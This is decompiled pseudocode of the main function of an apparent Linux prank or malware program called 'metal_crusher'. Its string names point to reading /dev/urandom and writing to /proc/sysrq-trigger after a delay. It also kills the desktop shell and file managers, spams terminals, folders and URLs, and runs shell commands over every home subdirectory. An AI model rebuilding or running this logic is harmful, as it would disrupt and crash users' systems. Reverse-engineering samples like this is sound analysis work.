__int64 metal_crusher::main()
{
  __int64 v0; // rbx
  __int64 v1; // r14
  __int64 v2; // rdx
  __int64 v3; // rcx
  __int64 v4; // r8
  __int64 v5; // r9
  __int64 v6; // rdx
  __int64 v7; // rsi
  __int64 v8; // rdx
  __int64 v9; // rcx
  __int64 v10; // r8
  __int64 v11; // r9
  char i; // r12
  __int64 v13; // rax
  __int64 v14; // rdx
  __int64 v15; // rcx
  __int64 v16; // r8
  __int64 v17; // r9
  __int64 v18; // rdx
  __int64 v19; // rcx
  __int64 v20; // r8
  __int64 v21; // r9
  __int64 v22; // rax
  __int64 v23; // rdx
  __int64 v24; // rcx
  __int64 v25; // r8
  __int64 v26; // r9
  __int64 v27; // rdx
  __int64 v28; // rcx
  __int64 v29; // r8
  __int64 v30; // r9
  __int64 v31; // rsi
  __int64 v32; // rdx
  __int64 v33; // rcx
  __int64 v34; // r8
  __int64 v35; // r9
  __int64 v36; // rax
  __int64 v37; // rdx
  __int64 v38; // rcx
  __int64 v39; // r8
  __int64 v40; // r9
  __int64 v41; // r8
  __int64 v42; // r9
  __int64 v43; // rdx
  __int64 v44; // rcx
  __int64 v45; // r8
  __int64 v46; // r9
  int v47; // ebx
  __int64 v48; // rsi
  __int64 v49; // rdx
  __int64 v50; // rcx
  __int64 v51; // r8
  __int64 v52; // r9
  __int64 v53; // rax
  __int64 v54; // rdx
  __int64 v55; // rcx
  __int64 v56; // r8
  __int64 v57; // r9
  int v58; // ebx
  __int64 v59; // rdx
  __int64 v60; // rcx
  __int64 v61; // r8
  __int64 v62; // r9
  __int64 v63; // rdx
  __int64 v64; // rcx
  __int64 v65; // r8
  __int64 v66; // r9
  __int64 v67; // rdx
  __int64 v68; // rcx
  __int64 v69; // r8
  __int64 v70; // r9
  char v71; // dl
  __int64 v72; // rdx
  __int64 v73; // rcx
  __int64 v74; // r8
  __int64 v75; // r9
  char v76; // dl
  __int64 v77; // rdx
  __int64 v78; // rcx
  __int64 v79; // r8
  __int64 v80; // r9
  __int128 v82; // [rsp+0h] [rbp-268h] BYREF
  unsigned __int128 v83; // [rsp+10h] [rbp-258h]
  __int128 v84; // [rsp+20h] [rbp-248h]
  const char *v85; // [rsp+30h] [rbp-238h]
  __int64 v86; // [rsp+38h] [rbp-230h]
  const char *v87; // [rsp+40h] [rbp-228h]
  __int64 v88; // [rsp+48h] [rbp-220h]
  __int64 v89; // [rsp+50h] [rbp-218h]
  __int64 v90; // [rsp+58h] [rbp-210h]
  const char *v91; // [rsp+60h] [rbp-208h] BYREF
  __int64 v92; // [rsp+68h] [rbp-200h]
  _BYTE v93[48]; // [rsp+70h] [rbp-1F8h] BYREF
  __int64 v94; // [rsp+A0h] [rbp-1C8h] BYREF
  char v95; // [rsp+A8h] [rbp-1C0h]
  __int128 v96; // [rsp+B0h] [rbp-1B8h] BYREF
  unsigned __int128 v97; // [rsp+C0h] [rbp-1A8h]
  __int128 v98; // [rsp+D0h] [rbp-198h]
  __int128 v99; // [rsp+E0h] [rbp-188h] BYREF
  __int64 v100; // [rsp+F0h] [rbp-178h]
  __int64 v101; // [rsp+F8h] [rbp-170h] BYREF
  char v102; // [rsp+100h] [rbp-168h]
  _BYTE v103[24]; // [rsp+108h] [rbp-160h] BYREF
  _BYTE v104[8]; // [rsp+120h] [rbp-148h] BYREF
  __int64 v105; // [rsp+128h] [rbp-140h]
  __int64 v106; // [rsp+130h] [rbp-138h]
  _QWORD v107[2]; // [rsp+138h] [rbp-130h] BYREF
  _BYTE v108[40]; // [rsp+148h] [rbp-120h] BYREF
  int v109; // [rsp+170h] [rbp-F8h] BYREF
  _BYTE v110[40]; // [rsp+178h] [rbp-F0h] BYREF
  __int128 v111; // [rsp+1A0h] [rbp-C8h] BYREF
  __int64 v112; // [rsp+1B0h] [rbp-B8h]
  __int128 v113; // [rsp+1B8h] [rbp-B0h] BYREF
  __int64 v114; // [rsp+1C8h] [rbp-A0h]
  _BYTE v115[24]; // [rsp+1D0h] [rbp-98h] BYREF
  __int128 v116; // [rsp+1E8h] [rbp-80h] BYREF
  __int64 v117; // [rsp+1F8h] [rbp-70h]
  __int128 v118; // [rsp+210h] [rbp-58h] BYREF
  _BYTE v119[72]; // [rsp+220h] [rbp-48h] BYREF

  std::env::args(&v82);
  core::iter::traits::iterator::Iterator::collect(v104, &v82);
  v0 = v105;
  v1 = v106;
  <T as alloc::slice::<impl [T]>::to_vec_in::ConvertVec>::to_vec(&v82);
  *(_QWORD *)&v93[16] = v83;
  *(_OWORD *)v93 = v82;
  core::result::Result<T,E>::unwrap(&v109, v93);
  if ( (unsigned __int8)<T as core::slice::cmp::SliceContains>::slice_contains(&v109, v0, v1) )
  {
    core::ptr::drop_in_place<alloc::string::String>(&v109);
    std::thread::sleep(108LL, 0LL);
    metal_crusher::fun::execute_shell((__int64)aCatDevUrandomA, 24LL);
    std::thread::sleep(1LL, 0LL);
    metal_crusher::fun::execute_shell((__int64)aEchoCProcSysrq, 28LL);
  }
  else
  {
    core::ptr::drop_in_place<alloc::string::String>(&v109);
    *(_QWORD *)&v97 = 0x8000000000000000LL;
    *(_QWORD *)&v96 = 0LL;
    BYTE8(v98) = 0;
    *(_QWORD *)&v84 = v98;
    BYTE8(v84) = 0;
    *(_DWORD *)((char *)&v84 + 9) = *(_DWORD *)((char *)&v98 + 9);
    *(_WORD *)((char *)&v84 + 13) = *(_WORD *)((char *)&v98 + 13);
    HIBYTE(v84) = HIBYTE(v98);
    v83 = __PAIR128__(*((unsigned __int64 *)&v97 + 1), 0x8000000000000000LL);
    v82 = v96;
    ((void (__fastcall *)(_BYTE *, __int128 *, __int64, __int64, __int64, __int64))std::thread::Builder::spawn_unchecked)(
      v93,
      &v82,
      v2,
      v3,
      v4,
      v5);
    core::result::Result<T,E>::expect(&v82, v93);
    core::ptr::drop_in_place<std::thread::JoinHandle<()>>(&v82);
    metal_crusher::music::play_audio();
    metal_crusher::fun::notify((__int64)aFunThingsWillH, 27LL, (__int64)aD_1, 2LL);
    std::thread::sleep(1LL, 0LL);
    metal_crusher::fun::notify((__int64)aFunThingsWillH, 27LL, (__int64)aD_1, 2LL);
    std::thread::sleep(0LL, 400000000LL);
    v91 = metal_crusher::fun::detect_terminal();
    v92 = v6;
    v7 = 300000000LL;
    std::thread::sleep(2LL, 300000000LL);
    for ( i = 1; ; i = 0 )
    {
      *(_QWORD *)&v82 = aXdgOpen_0;
      *((_QWORD *)&v82 + 1) = 10LL;
      *(_QWORD *)&v83 = aXdgOpenBin;
      *((_QWORD *)&v83 + 1) = 13LL;
      *(_QWORD *)&v84 = aXdgOpenLib;
      *((_QWORD *)&v84 + 1) = 13LL;
      v85 = aXdgOpenHome;
      v86 = 14LL;
      v87 = aXdgOpenTmp;
      v88 = 13LL;
      v89 = 0LL;
      v90 = 5LL;
      while ( 1 )
      {
        v13 = ((__int64 (__fastcall *)(__int128 *, __int64, __int64, __int64, __int64, __int64))<core::array::iter::IntoIter<T,_> as core::iter::traits::iterator::Iterator>::next)(
                &v82,
                v7,
                v8,
                v9,
                v10,
                v11);
        if ( !v13 )
          break;
        metal_crusher::fun::execute_shell(v13, v14);
        v7 = 600000000LL;
        std::thread::sleep(0LL, 600000000LL);
      }
      ((void (__fastcall *)(__int128 *, __int64, __int64, __int64, __int64, __int64))core::ptr::drop_in_place<core::array::iter::IntoIter<&str,5_usize>>)(
        &v82,
        v7,
        v14,
        v15,
        v16,
        v17);
      *(_QWORD *)&v82 = aLsSleep2000;
      *((_QWORD *)&v82 + 1) = 16LL;
      *(_QWORD *)&v83 = aLsTmpSleep2000;
      *((_QWORD *)&v83 + 1) = 19LL;
      *(_QWORD *)&v84 = aLsBinSleep2000;
      *((_QWORD *)&v84 + 1) = 19LL;
      v85 = aLsUsrSleep2000;
      v86 = 19LL;
      v87 = aLsEtcSleep2000;
      v88 = 19LL;
      v89 = 0LL;
      v90 = 5LL;
      while ( 1 )
      {
        v22 = ((__int64 (__fastcall *)(__int128 *, __int64, __int64, __int64, __int64, __int64))<core::array::iter::IntoIter<T,_> as core::iter::traits::iterator::Iterator>::next)(
                &v82,
                v7,
                v18,
                v19,
                v20,
                v21);
        if ( !v22 )
          break;
        metal_crusher::fun::run_in_terminal((__int64)v91, v92, v22, v23, v25, v26);
        v7 = 600000000LL;
        std::thread::sleep(0LL, 600000000LL);
      }
      ((void (__fastcall *)(__int128 *, __int64, __int64, __int64, __int64, __int64))core::ptr::drop_in_place<core::array::iter::IntoIter<&str,5_usize>>)(
        &v82,
        v7,
        v23,
        v24,
        v25,
        v26);
      metal_crusher::fun::destroy_gui_shell();
      metal_crusher::fun::destroy_file_managers();
      *(_QWORD *)v93 = &v91;
      *(_QWORD *)&v93[8] = <&T as core::fmt::Display>::fmt;
      *(_QWORD *)&v82 = &off_597680;
      *((_QWORD *)&v82 + 1) = 1LL;
      *(_QWORD *)&v84 = 0LL;
      *(_QWORD *)&v83 = v93;
      *((_QWORD *)&v83 + 1) = 1LL;
      ((void (__fastcall *)(__int128 *, __int128 *, __int64, __int64, __int64, __int64))core::option::Option<T>::map_or_else)(
        &v111,
        &v82,
        v27,
        v28,
        v29,
        v30);
      v82 = v111;
      *(_QWORD *)&v83 = v112;
      metal_crusher::fun::execute_shell(*((__int64 *)&v111 + 1), v112);
      core::ptr::drop_in_place<alloc::string::String>(&v82);
      v31 = 200000000LL;
      std::thread::sleep(1LL, 200000000LL);
      metal_crusher::fun::reanimate_gui_shell();
      *(_QWORD *)&v82 = aXdgOpenDev;
      *((_QWORD *)&v82 + 1) = 13LL;
      *(_QWORD *)&v83 = aXdgOpenSbin;
      *((_QWORD *)&v83 + 1) = 14LL;
      *(_QWORD *)&v84 = aXdgOpenRun;
      *((_QWORD *)&v84 + 1) = 13LL;
      v85 = aXdgOpenSys;
      v86 = 13LL;
      v87 = aXdgOpenProc;
      v88 = 14LL;
      v89 = 0LL;
      v90 = 5LL;
      while ( 1 )
      {
        v36 = ((__int64 (__fastcall *)(__int128 *, __int64, __int64, __int64, __int64, __int64))<core::array::iter::IntoIter<T,_> as core::iter::traits::iterator::Iterator>::next)(
                &v82,
                v31,
                v32,
                v33,
                v34,
                v35);
        if ( !v36 )
          break;
        metal_crusher::fun::execute_shell(v36, v37);
        v31 = 600000000LL;
        std::thread::sleep(0LL, 600000000LL);
      }
      ((void (__fastcall *)(__int128 *, __int64, __int64, __int64, __int64, __int64))core::ptr::drop_in_place<core::array::iter::IntoIter<&str,5_usize>>)(
        &v82,
        v31,
        v37,
        v38,
        v39,
        v40);
      metal_crusher::fun::run_in_terminal((__int64)v91, v92, (__int64)aTreeHomeSleep2, 22LL, v41, v42);
      std::thread::sleep(0LL, 600000000LL);
      v47 = 4;
      while ( --v47 )
      {
        metal_crusher::fun::run_in_terminal((__int64)v91, v92, (__int64)aPsAuxSleep2000, 18LL, v45, v46);
        std::thread::sleep(0LL, 600000000LL);
      }
      *(_QWORD *)v93 = &v91;
      *(_QWORD *)&v93[8] = <&T as core::fmt::Display>::fmt;
      *(_QWORD *)&v82 = &off_597680;
      *((_QWORD *)&v82 + 1) = 1LL;
      *(_QWORD *)&v84 = 0LL;
      *(_QWORD *)&v83 = v93;
      *((_QWORD *)&v83 + 1) = 1LL;
      ((void (__fastcall *)(__int128 *, __int128 *, __int64, __int64, __int64, __int64))core::option::Option<T>::map_or_else)(
        &v113,
        &v82,
        v43,
        v44,
        v45,
        v46);
      v82 = v113;
      *(_QWORD *)&v83 = v114;
      metal_crusher::fun::execute_shell(*((__int64 *)&v113 + 1), v114);
      core::ptr::drop_in_place<alloc::string::String>(&v82);
      std::thread::sleep(1LL, 200000000LL);
      metal_crusher::fun::destroy_file_managers();
      v48 = 0LL;
      std::thread::sleep(2LL, 0LL);
      metal_crusher::fun::toggle_desktop_overview();
      metal_crusher::fun::put_random_shit_on_desktop();
      metal_crusher::fun::toggle_desktop_overview();
      *(_QWORD *)&v82 = aXdgOpenHttpsWw;
      *((_QWORD *)&v82 + 1) = 40LL;
      *(_QWORD *)&v83 = aXdgOpenHttpsWw_0;
      *((_QWORD *)&v83 + 1) = 46LL;
      *(_QWORD *)&v84 = aXdgOpenHttps2i;
      *((_QWORD *)&v84 + 1) = 23LL;
      v85 = aXdgOpenHttpsGi;
      v86 = 56LL;
      v87 = aXdgOpenHttpsWw_1;
      v88 = 56LL;
      v89 = 0LL;
      v90 = 5LL;
      while ( 1 )
      {
        v53 = ((__int64 (__fastcall *)(__int128 *, __int64, __int64, __int64, __int64, __int64))<core::array::iter::IntoIter<T,_> as core::iter::traits::iterator::Iterator>::next)(
                &v82,
                v48,
                v49,
                v50,
                v51,
                v52);
        if ( !v53 )
          break;
        metal_crusher::fun::execute_shell(v53, v54);
        metal_crusher::fun::execute_shell(1LL, 0LL);
        v48 = 500000000LL;
        std::thread::sleep(1LL, 500000000LL);
      }
      ((void (__fastcall *)(__int128 *, __int64, __int64, __int64, __int64, __int64))core::ptr::drop_in_place<core::array::iter::IntoIter<&str,5_usize>>)(
        &v82,
        v48,
        v54,
        v55,
        v56,
        v57);
      std::thread::sleep(0LL, 500000000LL);
      v58 = 8;
      while ( --v58 )
      {
        std::thread::sleep(0LL, 200000000LL);
        metal_crusher::fun::toggle_desktop_overview();
      }
      if ( (i & 1) == 0 )
        break;
      v7 = 500000000LL;
      std::thread::sleep(3LL, 500000000LL);
    }
    std::env::var(&v82, aUser, 4LL);
    ((void (__fastcall *)(_BYTE *, __int128 *, __int64, __int64, __int64, __int64))core::result::Result<T,E>::unwrap)(
      v115,
      &v82,
      v59,
      v60,
      v61,
      v62);
    v84 = v98;
    v83 = v97;
    v82 = v96;
    ((void (__fastcall *)(_BYTE *, __int128 *, __int64, __int64, __int64, __int64))std::thread::Builder::spawn_unchecked)(
      v93,
      &v82,
      v63,
      v64,
      v65,
      v66);
    core::result::Result<T,E>::expect(&v82, v93);
    core::ptr::drop_in_place<std::thread::JoinHandle<()>>(&v82);
    std::thread::Builder::spawn_unchecked(&v82, &v96);
    core::result::Result<T,E>::expect(v93, &v82);
    core::ptr::drop_in_place<std::thread::JoinHandle<()>>(v93);
    *(_QWORD *)v93 = v115;
    *(_QWORD *)&v93[8] = <alloc::string::String as core::fmt::Display>::fmt;
    *(_QWORD *)&v82 = &off_597690;
    *((_QWORD *)&v82 + 1) = 1LL;
    *(_QWORD *)&v84 = 0LL;
    *(_QWORD *)&v83 = v93;
    *((_QWORD *)&v83 + 1) = 1LL;
    ((void (__fastcall *)(_BYTE *, __int128 *, __int64, __int64, __int64, __int64))core::option::Option<T>::map_or_else)(
      v119,
      &v82,
      v67,
      v68,
      v69,
      v70);
    std::fs::read_dir(&v82, v119);
    v94 = core::result::Result<T,E>::unwrap(v82, DWORD2(v82), &off_5976E0);
    v95 = v71 & 1;
    while ( 1 )
    {
      <std::fs::ReadDir as core::iter::traits::iterator::Iterator>::next(&v109, &v94);
      if ( v109 != 1 )
        break;
      core::result::Result<T,E>::unwrap(v108, v110, &off_5976F8);
      std::fs::DirEntry::file_type(&v82, v108);
      if ( (core::result::Result<T,E>::unwrap(&v82, &off_597710) & 0xF000) == 0x4000 )
      {
        std::fs::DirEntry::path(v93, v108);
        *(_OWORD *)v103 = *(_OWORD *)&v93[8];
        *(_QWORD *)&v99 = v103;
        *((_QWORD *)&v99 + 1) = <std::path::Display as core::fmt::Display>::fmt;
        *(_QWORD *)&v82 = &off_5976A0;
        *((_QWORD *)&v82 + 1) = 1LL;
        *(_QWORD *)&v84 = 0LL;
        *(_QWORD *)&v83 = &v99;
        *((_QWORD *)&v83 + 1) = 1LL;
        ((void (__fastcall *)(__int128 *, __int128 *, __int64, __int64, __int64, __int64))core::option::Option<T>::map_or_else)(
          &v116,
          &v82,
          v72,
          v73,
          v74,
          v75);
        core::ptr::drop_in_place<std::path::PathBuf>(v93);
        v82 = v116;
        *(_QWORD *)&v83 = v117;
        metal_crusher::fun::execute_shell(*((__int64 *)&v116 + 1), v117);
        core::ptr::drop_in_place<alloc::string::String>(&v82);
        std::fs::DirEntry::path(&v82, v108);
        std::fs::read_dir(v93, &v82);
        v101 = core::result::Result<T,E>::unwrap(*(_QWORD *)v93, *(unsigned int *)&v93[8], &off_597728);
        v102 = v76 & 1;
        while ( 1 )
        {
          <std::fs::ReadDir as core::iter::traits::iterator::Iterator>::next(v93, &v101);
          if ( *(_DWORD *)v93 != 1 )
            break;
          core::result::Result<T,E>::unwrap(&v116, &v93[8], &off_597740);
          std::fs::DirEntry::file_type(&v82, &v116);
          if ( (core::result::Result<T,E>::unwrap(&v82, &off_597758) & 0xF000) == 0x4000 )
          {
            std::fs::DirEntry::path(v103, &v116);
            v118 = *(_OWORD *)&v103[8];
            v107[0] = &v118;
            v107[1] = <std::path::Display as core::fmt::Display>::fmt;
            *(_QWORD *)&v82 = &off_5976A0;
            *((_QWORD *)&v82 + 1) = 1LL;
            *(_QWORD *)&v84 = 0LL;
            *(_QWORD *)&v83 = v107;
            *((_QWORD *)&v83 + 1) = 1LL;
            ((void (__fastcall *)(__int128 *, __int128 *, __int64, __int64, __int64, __int64))core::option::Option<T>::map_or_else)(
              &v99,
              &v82,
              v77,
              v78,
              v79,
              v80);
            core::ptr::drop_in_place<std::path::PathBuf>(v103);
            v82 = v99;
            *(_QWORD *)&v83 = v100;
            metal_crusher::fun::execute_shell(*((__int64 *)&v99 + 1), v100);
            core::ptr::drop_in_place<alloc::string::String>(&v82);
            std::thread::sleep(0LL, 400000000LL);
            metal_crusher::fun::toggle_desktop_overview();
          }
          core::ptr::drop_in_place<std::fs::DirEntry>(&v116);
        }
        core::ptr::drop_in_place<std::fs::ReadDir>(&v101);
        metal_crusher::fun::toggle_desktop_overview();
        std::thread::sleep(0LL, 400000000LL);
      }
      core::ptr::drop_in_place<std::fs::DirEntry>(v108);
    }
    core::ptr::drop_in_place<std::fs::ReadDir>(&v94);
    std::thread::sleep(40LL, 0LL);
    core::ptr::drop_in_place<alloc::string::String>(v115);
  }
  return core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(v104);
}